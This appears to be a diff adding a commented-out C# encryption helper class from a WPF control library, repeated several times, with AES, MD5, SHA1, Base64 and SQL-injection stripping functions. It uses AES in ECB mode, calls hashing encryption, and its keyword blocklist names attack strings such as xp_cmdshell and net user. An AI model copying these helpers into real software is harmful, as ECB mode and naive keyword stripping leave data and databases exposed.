+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
+
+// Copyright (c) HeBianGu Authors. All Rights Reserved. 
+// Author: HeBianGu 
+// Github: https://github.com/HeBianGu/WPF-Control 
+// Document: https://hebiangu.github.io/WPF-Control-Docs  
+// QQ:908293466 Group:971261058 
+// bilibili: https://space.bilibili.com/370266611 
+// Licensed under the MIT License (the "License")
+
+//namespace EncryptHelper
+//{
+//    public class EncryptHelper
+//    {
+//        //DES用于加密内容较多的敏感信息
+//        //AES用于加密内容较少强度较高的信息
+
+//        /// <summary>
+//        /// Aes加密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>加密后的字符串</returns>
+//        public static string AESEncrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//            aesProvider.Mode = CipherMode.ECB;
+//            aesProvider.Padding = PaddingMode.PKCS7;
+//            using (ICryptoTransform cryptoTransform = aesProvider.CreateEncryptor())
+//            {
+//                byte[] inputBuffers = Encoding.UTF8.GetBytes(value);
+//                byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                aesProvider.Clear();
+//                aesProvider.Dispose();
+//                return Convert.ToBase64String(results, 0, results.Length);
+//            }
+//        }
+//        /// <summary>
+//        /// Aes解密
+//        /// </summary>
+//        /// <param name="value">源字符串</param>
+//        /// <param name="key">aes密钥，长度必须32位</param>
+//        /// <returns>解密后的字符串</returns>
+//        public static string AESDecrypt(string value, string key)
+//        {
+//            Aes aesProvider = Aes.Create();
+//            {
+//                aesProvider.Key = Encoding.UTF8.GetBytes(key);
+//                aesProvider.Mode = CipherMode.ECB;
+//                aesProvider.Padding = PaddingMode.PKCS7;
+//                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
+//                {
+//                    byte[] inputBuffers = Convert.FromBase64String(value);
+//                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
+//                    aesProvider.Clear();
+//                    return Encoding.UTF8.GetString(results);
+//                }
+//            }
+//        }
+//        /// <summary>
+//        /// MD5加密
+//        /// </summary>
+//        /// <param name="value">需要加密字符串</param>
+//        /// <returns>返回32位大写字符</returns>
+//        public static string MD5Encrypt(string value)
+//        {
+//            //将输入字符串转换成字节数组  ANSI代码页编码
+//            var buffer = Encoding.Default.GetBytes(value);
+//            //接着，创建Md5对象进行散列计算
+//            var data = MD5.Create().ComputeHash(buffer);
+//            //创建一个新的Stringbuilder收集字节
+//            var sb = new StringBuilder();
+//            //遍历每个字节的散列数据 
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制字符串
+//                sb.Append(t.ToString("X2"));
+//            }
+//            //返回十六进制字符串
+//            return sb.ToString();
+//        }
+//        /// <summary>  
+//        /// SHA1加密
+//        /// </summary>  
+//        /// <param name="content">需要加密字符串</param>  
+//        /// <param name="encode">指定加密编码</param>  
+//        /// <returns>返回40位大写字符串</returns>  
+//        public static string SHA1(string value)
+//        {
+//            //UTF8编码
+//            var buffer = Encoding.UTF8.GetBytes(value);
+//            SHA1 sha1 = System.Security.Cryptography.SHA1.Create();
+//            var data = sha1.ComputeHash(buffer);
+//            var sb = new StringBuilder();
+//            foreach (var t in data)
+//            {
+//                //转换大写十六进制
+//                sb.Append(t.ToString("X2"));
+//            }
+//            return sb.ToString();
+//        }
+//        /// <summary>
+//        /// Base64编码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string EncodeBase64(string code_type, string code)
+//        {
+//            string encode = "";
+//            byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
+//            try
+//            {
+//                encode = Convert.ToBase64String(bytes);
+//            }
+//            catch
+//            {
+//                encode = code;
+//            }
+//            return encode;
+//        }
+//        /// <summary>
+//        /// Base64解码
+//        /// </summary>
+//        /// <param name="code_type"></param>
+//        /// <param name="code"></param>
+//        /// <returns></returns>
+//        public static string DecodeBase64(string code_type, string code)
+//        {
+//            string decode = "";
+//            byte[] bytes = Convert.FromBase64String(code);
+//            try
+//            {
+//                decode = Encoding.GetEncoding(code_type).GetString(bytes);
+//            }
+//            catch
+//            {
+//                decode = code;
+//            }
+//            return decode;
+//        }
+//        /// <summary>
+//        /// SQL注入字符清理
+//        /// </summary>
+//        /// <param name="value">需要清理的字符串</param>
+//        /// <returns></returns>
+//        public static string SqlTextClear(string value)
+//        {
+//            string[] replaceStr = new string[] { ",", "<", ">", "--", "'", "\"", "=", "%", " " };
+//            foreach (var item in replaceStr)
+//            {
+//                value = value.Replace(item, "");
+//            }
+//            return value;
+//        }
+//        /// <summary>
+//        /// 替换特殊字符，防SQL注入
+//        /// </summary>
+//        /// <param name="str"></param>
+//        /// <returns></returns>
+//        public static string ReplaceSQLChar(string str)
+//        {
+//            if (string.IsNullOrEmpty(str))
+//                return "";
+
+//            str = str.Replace("'", "");
+//            str = str.Replace(";", "");
+//            str = str.Replace(",", "");
+//            str = str.Replace("?", "");
+//            str = str.Replace("<", "");
+//            str = str.Replace(">", "");
+//            str = str.Replace("(", "");
+//            str = str.Replace(")", "");
+//            str = str.Replace("@", "");
+//            str = str.Replace("=", "");
+//            str = str.Replace("+", "");
+//            str = str.Replace("*", "");
+//            str = str.Replace("&", "");
+//            str = str.Replace("#", "");
+//            str = str.Replace("%", "");
+//            str = str.Replace("$", "");
+
+//            //删除与数据库相关的词
+//            str = Regex.Replace(str, "select", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "insert", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete from", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "count", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop table", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "asc", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "char", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "xp_cmdshell", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "exec master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net localgroup administrators", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net user", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "or", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "net", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "-", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "delete", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "drop", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "script", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "update", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "and", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "chr", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "master", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "truncate", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "declare", "", RegexOptions.IgnoreCase);
+//            str = Regex.Replace(str, "mid", "", RegexOptions.IgnoreCase);
+
+//            return str;
+//        }
+//    }
+//}
